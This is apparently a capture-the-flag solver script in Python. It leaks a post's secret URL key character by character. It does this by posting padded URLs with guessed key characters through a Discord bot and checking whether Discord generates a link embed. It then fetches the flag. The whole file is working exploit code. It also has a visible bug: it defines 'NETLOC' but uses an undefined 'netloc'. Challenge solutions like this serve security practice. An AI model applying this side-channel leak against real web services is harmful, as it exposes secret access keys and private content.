import os
from pydoc import cli
import string
import requests
import discord

import asyncio
import threading
import base64
from time import sleep

# connection info
HOST = os.getenv("HOST", "localhost")
PORT = os.getenv("PORT", "8017")
NETLOC = f'{HOST}:{PORT}'

channel_id = 0
discord_secret = ""

# discord
client = discord.Client()
channel = None

@client.event
async def on_ready():
    global channel
    print(f"We've logged in as {client.user}")
    channel = client.get_channel(channel_id)
    if channel is None:
        print("failed to get channel")
        exit(1)

discord_loop = asyncio.get_event_loop()
discord_loop.create_task(client.start(discord_secret))
threading.Thread(target=discord_loop.run_forever).start()

MESSAGE_LENGTH_LIMIT = 2000
def send_message(message):
    assert channel is not None
    task = asyncio.ensure_future(channel.send(message), loop=discord_loop)
    while not task.done(): sleep(0.5)
    return task.result()

while not client.is_ready():
    sleep(0.5)

URLSAFE_BASE64_CHARS = string.ascii_letters + string.digits + "-_"

ID_LEN = 16
KEY_LEN = 10

FILL_LEN = MESSAGE_LENGTH_LIMIT - len(f"url: http://{netloc}post/{'a' * ID_LEN}?key=")
def get_url(id, leak_num):
    assert(len(id) == ID_LEN)
    url = f"http://{netloc}{'/' * (FILL_LEN - leak_num)}post/{id}"
    return url

post_id = requests.post(
    f"http://{netloc}/api/new",
    { "title": "hey", "content": "hello" }
).json()["action"].split('/')[-1]

print(f'[+] {post_id=}')

current_key = ''
while len(current_key) < KEY_LEN:
    report_url = get_url(post_id, len(current_key) + 1)
    input(f"[*] please report this url: {report_url}\n> ")
    print("[+] searching", end="", flush=True)
    for c in URLSAFE_BASE64_CHARS:
        posted_url = f'{report_url}?key={current_key}{c}'
        res = send_message(posted_url)
        print(".", end="", flush=True)
        if not res.embeds: continue
        print()
        current_key += c
        print(f"[+] found, {current_key=}")
        break
    else:
        print("[!] Key Not found")
        exit(1)

post = requests.get(
    f"http://{netloc}/post/{post_id}?key={current_key}"
).content

assert b"Your flag is: " in post

flag = post.split(b'Your flag is: ')[1].split(b'</strong>')[0]
print(flag)
